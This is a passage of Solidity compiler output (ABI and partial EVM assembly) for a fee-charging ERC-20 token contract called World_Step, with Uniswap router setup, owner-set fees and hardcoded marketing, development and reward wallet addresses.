{
	"contracts/Pool/Pool.sol": {
		"World_Step": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "previousOwner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "newOwner",
							"type": "address"
						}
					],
					"name": "OwnershipTransferred",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "previous",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "adr",
							"type": "address"
						}
					],
					"name": "devAddressUpdated",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "previous",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "adr",
							"type": "address"
						}
					],
					"name": "marketingAddressUpdated",
					"type": "event"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "_buyToken",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "_factory",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address[]",
							"name": "accounts",
							"type": "address[]"
						},
						{
							"internalType": "bool",
							"name": "excluded",
							"type": "bool"
						}
					],
					"name": "excludeMultipleAccountsFromFees",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "manualsend",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "manualswap",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "renounceOwnership",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "redisFeeOnBuy",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "redisFeeOnSell",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "taxFeeOnBuy",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "taxFeeOnSell",
							"type": "uint256"
						}
					],
					"name": "setFee",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "dev",
							"type": "address"
						}
					],
					"name": "setNewDevAddress",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "markt",
							"type": "address"
						}
					],
					"name": "setNewMarketingAddress",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "bool",
							"name": "_swapEnabled",
							"type": "bool"
						}
					],
					"name": "toggleSwap",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "recipient",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "recipient",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "newOwner",
							"type": "address"
						}
					],
					"name": "transferOwnership",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapV2Factory",
					"outputs": [
						{
							"internalType": "contract IUniswapV2Factory",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapV2Pair",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapV2Router",
					"outputs": [
						{
							"internalType": "contract IUniswapV2Router02",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Pool/Pool.sol\":3725:16044  contract World_Step is Context, IERC20, Ownable {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n  0x0de0b6b3a7640000\n    /* \"contracts/Pool/Pool.sol\":4085:4097  1*10**9*10*9 */\n  0x14f46b0400\n    /* \"contracts/Pool/Pool.sol\":4191:4204  MAX % _tTotal */\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/Pool/Pool.sol\":4085:4097  1*10**9*10*9 */\n  0x14f46b0400\n    /* \"contracts/Pool/Pool.sol\":4184:4205  MAX - (MAX % _tTotal) */\n  tag_3\n  swap2\n  swap1\n  tag_4\n  jump\t// in\ntag_3:\n    /* \"contracts/Pool/Pool.sol\":4157:4206  uint256 private _rTotal = (MAX - (MAX % _tTotal)) */\n  0x06\n  sstore\n    /* \"contracts/Pool/Pool.sol\":4282:4283  1 */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":4249:4283  uint256 private _redisFeeOnBuy = 1 */\n  0x08\n  sstore\n    /* \"contracts/Pool/Pool.sol\":4320:4321  4 */\n  0x04\n    /* \"contracts/Pool/Pool.sol\":4289:4321  uint256 private _taxFeeOnBuy = 4 */\n  0x09\n  sstore\n    /* \"contracts/Pool/Pool.sol\":4366:4367  1 */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":4332:4367  uint256 private _redisFeeOnSell = 1 */\n  0x0a\n  sstore\n    /* \"contracts/Pool/Pool.sol\":4405:4406  1 */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":4373:4406  uint256 private _taxFeeOnSell = 1 */\n  0x0b\n  sstore\n    /* \"contracts/Pool/Pool.sol\":4505:4510  false */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":4478:4510  bool private _activePair = false */\n  0x0e\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":4717:4759  0x8492cbd894686D7e98214541903c7BA6f94928D6 */\n  0x8492cbd894686d7e98214541903c7ba6f94928d6\n    /* \"contracts/Pool/Pool.sol\":4663:4760  address payable private _developmentAddress = payable(0x8492cbd894686D7e98214541903c7BA6f94928D6) */\n  0x0e\n  exp(0x0100, 0x01)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":4818:4860  0xa4eD7aa4eF5deB0A63e97d9Cb77445aE553feb1d */\n  0xa4ed7aa4ef5deb0a63e97d9cb77445ae553feb1d\n    /* \"contracts/Pool/Pool.sol\":4766:4861  address payable private _marketingAddress = payable(0xa4eD7aa4eF5deB0A63e97d9Cb77445aE553feb1d) */\n  0x0f\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":4913:4955  0xe061915592536656a92B9fd59e46b19eF920692F */\n  0xe061915592536656a92b9fd59e46b19ef920692f\n    /* \"contracts/Pool/Pool.sol\":4867:4956  address payable private _rewardPool = payable(0xe061915592536656a92B9fd59e46b19eF920692F) */\n  0x10\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5149:5154  false */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5127:5154  bool private inSwap = false */\n  0x14\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5187:5191  true */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":5160:5191  bool private swapEnabled = true */\n  0x14\n  exp(0x0100, 0x15)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5293:5926  constructor () {... */\n  callvalue\n  dup1\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  pop\n    /* \"contracts/Pool/Pool.sol\":2992:3009  address msgSender */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":3012:3024  _msgSender() */\n  tag_9\n    /* \"contracts/Pool/Pool.sol\":3012:3022  _msgSender */\n  shl(0x20, tag_10)\n    /* \"contracts/Pool/Pool.sol\":3012:3024  _msgSender() */\n  0x20\n  shr\n  jump\t// in\ntag_9:\n    /* \"contracts/Pool/Pool.sol\":2992:3024  address msgSender = _msgSender() */\n  swap1\n  pop\n    /* \"contracts/Pool/Pool.sol\":3043:3052  msgSender */\n  dup1\n    /* \"contracts/Pool/Pool.sol\":3034:3040  _owner */\n  0x00\n  dup1\n    /* \"contracts/Pool/Pool.sol\":3034:3052  _owner = msgSender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":3100:3109  msgSender */\n  dup1\n    /* \"contracts/Pool/Pool.sol\":3067:3110  OwnershipTransferred(address(0), msgSender) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Pool/Pool.sol\":3096:3097  0 */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":3067:3110  OwnershipTransferred(address(0), msgSender) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n  mload(0x40)\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Pool/Pool.sol\":2982:3117  {... */\n  pop\n    /* \"contracts/Pool/Pool.sol\":5342:5349  _rTotal */\n  sload(0x06)\n    /* \"contracts/Pool/Pool.sol\":5318:5325  _rOwned */\n  0x02\n    /* \"contracts/Pool/Pool.sol\":5318:5339  _rOwned[_msgSender()] */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5326:5338  _msgSender() */\n  tag_12\n    /* \"contracts/Pool/Pool.sol\":5326:5336  _msgSender */\n  shl(0x20, tag_10)\n    /* \"contracts/Pool/Pool.sol\":5326:5338  _msgSender() */\n  0x20\n  shr\n  jump\t// in\ntag_12:\n    /* \"contracts/Pool/Pool.sol\":5318:5339  _rOwned[_msgSender()] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n    /* \"contracts/Pool/Pool.sol\":5318:5349  _rOwned[_msgSender()] = _rTotal */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5368:5403  IUniswapV2Router02 _uniswapV2Router */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5433:5475  0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 */\n  0x9ac64cc6e4415144c455bd8e4837fea55603e5c3\n    /* \"contracts/Pool/Pool.sol\":5368:5477  IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3)) */\n  swap1\n  pop\n    /* \"contracts/Pool/Pool.sol\":5505:5521  _uniswapV2Router */\n  dup1\n    /* \"contracts/Pool/Pool.sol\":5487:5502  uniswapV2Router */\n  0x11\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5487:5521  uniswapV2Router = _uniswapV2Router */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5565:5581  _uniswapV2Router */\n  dup1\n    /* \"contracts/Pool/Pool.sol\":5565:5589  _uniswapV2Router.factory */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xc45a0155\n    /* \"contracts/Pool/Pool.sol\":5565:5591  _uniswapV2Router.factory() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_14\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_14:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_15\n  swap2\n  swap1\n  tag_16\n  jump\t// in\ntag_15:\n    /* \"contracts/Pool/Pool.sol\":5547:5616  IUniswapV2Factory(_uniswapV2Router.factory())... */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xc9c65396\n    /* \"contracts/Pool/Pool.sol\":5625:5629  this */\n  address\n    /* \"contracts/Pool/Pool.sol\":5632:5648  _uniswapV2Router */\n  dup4\n    /* \"contracts/Pool/Pool.sol\":5632:5653  _uniswapV2Router.WETH */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xad5c4648\n    /* \"contracts/Pool/Pool.sol\":5632:5655  _uniswapV2Router.WETH() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_18\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_18:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_19\n  swap2\n  swap1\n  tag_16\n  jump\t// in\ntag_19:\n    /* \"contracts/Pool/Pool.sol\":5547:5657  IUniswapV2Factory(_uniswapV2Router.factory())... */\n  mload(0x40)\n  dup4\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  tag_20\n  swap3\n  swap2\n  swap1\n  tag_21\n  jump\t// in\ntag_20:\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_23\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_23:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_24\n  swap2\n  swap1\n  tag_16\n  jump\t// in\ntag_24:\n    /* \"contracts/Pool/Pool.sol\":5531:5544  uniswapV2Pair */\n  0x14\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5531:5657  uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())... */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5697:5701  true */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":5667:5685  _isExcludedFromFee */\n  0x05\n    /* \"contracts/Pool/Pool.sol\":5667:5694  _isExcludedFromFee[owner()] */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5686:5693  owner() */\n  tag_25\n    /* \"contracts/Pool/Pool.sol\":5686:5691  owner */\n  shl(0x20, tag_26)\n    /* \"contracts/Pool/Pool.sol\":5686:5693  owner() */\n  0x20\n  shr\n  jump\t// in\ntag_25:\n    /* \"contracts/Pool/Pool.sol\":5667:5694  _isExcludedFromFee[owner()] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5667:5701  _isExcludedFromFee[owner()] = true */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5747:5751  true */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":5711:5729  _isExcludedFromFee */\n  0x05\n    /* \"contracts/Pool/Pool.sol\":5711:5744  _isExcludedFromFee[address(this)] */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5738:5742  this */\n  address\n    /* \"contracts/Pool/Pool.sol\":5711:5744  _isExcludedFromFee[address(this)] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5711:5751  _isExcludedFromFee[address(this)] = true */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5803:5807  true */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":5761:5779  _isExcludedFromFee */\n  0x05\n    /* \"contracts/Pool/Pool.sol\":5761:5800  _isExcludedFromFee[_developmentAddress] */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5780:5799  _developmentAddress */\n  0x0e\n  0x01\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Pool/Pool.sol\":5761:5800  _isExcludedFromFee[_developmentAddress] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5761:5807  _isExcludedFromFee[_developmentAddress] = true */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5857:5861  true */\n  0x01\n    /* \"contracts/Pool/Pool.sol\":5817:5835  _isExcludedFromFee */\n  0x05\n    /* \"contracts/Pool/Pool.sol\":5817:5854  _isExcludedFromFee[_marketingAddress] */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5836:5853  _marketingAddress */\n  0x0f\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Pool/Pool.sol\":5817:5854  _isExcludedFromFee[_marketingAddress] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5817:5861  _isExcludedFromFee[_marketingAddress] = true */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Pool/Pool.sol\":5897:5909  _msgSender() */\n  tag_27\n    /* \"contracts/Pool/Pool.sol\":5897:5907  _msgSender */\n  shl(0x20, tag_10)\n    /* \"contracts/Pool/Pool.sol\":5897:5909  _msgSender() */\n  0x20\n  shr\n  jump\t// in\ntag_27:\n    /* \"contracts/Pool/Pool.sol\":5876:5919  Transfer(address(0), _msgSender(), _tTotal) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Pool/Pool.sol\":5893:5894  0 */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":5876:5919  Transfer(address(0), _msgSender(), _tTotal) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n  0x0de0b6b3a7640000\n    /* \"contracts/Pool/Pool.sol\":5876:5919  Transfer(address(0), _msgSender(), _tTotal) */\n  mload(0x40)\n  tag_28\n  swap2\n  swap1\n  tag_29\n  jump\t// in\ntag_28:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Pool/Pool.sol\":5308:5926  {... */\n  pop\n    /* \"contracts/Pool/Pool.sol\":3725:16044  contract World_Step is Context, IERC20, Ownable {... */\n  jump(tag_30)\n    /* \"contracts/Pool/Pool.sol\":1659:1755  function _msgSender() internal view virtual returns (address) {... */\ntag_10:\n    /* \"contracts/Pool/Pool.sol\":1712:1719  address */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":1738:1748  msg.sender */\n  caller\n    /* \"contracts/Pool/Pool.sol\":1731:1748  return msg.sender */\n  swap1\n  pop\n    /* \"contracts/Pool/Pool.sol\":1659:1755  function _msgSender() internal view virtual returns (address) {... */\n  swap1\n  jump\t// out\n    /* \"contracts/Pool/Pool.sol\":3123:3200  function owner() public view returns (address) {... */\ntag_26:\n    /* \"contracts/Pool/Pool.sol\":3161:3168  address */\n  0x00\n    /* \"contracts/Pool/Pool.sol\":3187:3193  _owner */\n  dup1\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Pool/Pool.sol\":3180:3193  return _owner */\n  swap1\n  pop\n    /* \"contracts/Pool/Pool.sol\":3123:3200  function owner() public view returns (address) {... */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":7:84   */\ntag_33:\n    /* \"#utility.yul\":44:51   */\n  0x00\n    /* \"#utility.yul\":73:78   */\n  dup2\n    /* \"#utility.yul\":62:78   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:84   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":90:270   */\ntag_34:\n    /* \"#utility.yul\":138:215   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":135:136   */\n  0x00\n    /* \"#utility.yul\":128:216   */\n  mstore\n    /* \"#utility.yul\":235:239   */\n  0x12\n    /* \"#utility.yul\":232:233   */\n  0x04\n    /* \"#utility.yul\":225:240   */\n  mstore\n    /* \"#utility.yul\":259:263   */\n  0x24\n    /* \"#utility.yul\":256:257   */\n  0x00\n    /* \"#utility.yul\":249:264   */\n  revert\n    /* \"#utility.yul\":276:452   */\ntag_2:\n    /* \"#utility.yul\":308:309   */\n  0x00\n    /* \"#utility.yul\":325:345   */\n  tag_49\n    /* \"#utility.yul\":343:344   */\n  dup3\n    /* \"#utility.yul\":325:345   */\n  tag_33\n  jump\t// in\ntag_49:\n    /* \"#utility.yul\":320:345   */\n  swap2\n  pop\n    /* \"#utility.yul\":359:379   */\n  tag_50\n    /* \"#utility.yul\":377:378   */\n  dup4\n    /* \"#utility.yul\":359:379   */\n  tag_33\n  jump\t// in\ntag_50:\n    /* \"#utility.yul\":354:379   */\n  swap3\n  pop\n    /* \"#utility.yul\":398:399   */\n  dup3\n    /* \"#utility.yul\":388:423   */\n  tag_51\n  jumpi\n    /* \"#utility.yul\":403:421   */\n  tag_52\n  tag_34\n  jump\t// in\ntag_52:\n    /* \"#utility.yul\":388:423   */\ntag_51:\n    /* \"#utility.yul\":444:445   */\n  dup3\n    /* \"#utility.yul\":441:442   */\n  dup3\n    /* \"#utility.yul\":437:446   */\n  mod\n    /* \"#utility.yul\":432:446   */\n  swap1\n  pop\n    /* \"#utility.yul\":276:452   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":458:638   */\ntag_35:\n    /* \"#utility.yul\":506:583   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":503:504   */\n  0x00\n    /* \"#utility.yul\":496:584   */\n  mstore\n    /* \"#utility.yul\":603:607   */\n  0x11\n    /* \"#utility.yul\":600:601   */\n  0x04\n    /* \"#utility.yul\":593:608   */\n  mstore\n    /* \"#utility.yul\":627:631   */\n  0x24\n    /* \"#utility.yul\":624:625   */\n  0x00\n    /* \"#utility.yul\":617:632   */\n  revert\n    /* \"#utility.yul\":644:835   */\ntag_4:\n    /* \"#utility.yul\":684:688   */\n  0x00\n    /* \"#utility.yul\":704:724   */\n  tag_55\n    /* \"#utility.yul\":722:723   */\n  dup3\n    /* \"#utility.yul\":704:724   */\n  tag_33\n  jump\t// in\ntag_55:\n    /* \"#utility.yul\":699:724   */\n  swap2\n  pop\n    /* 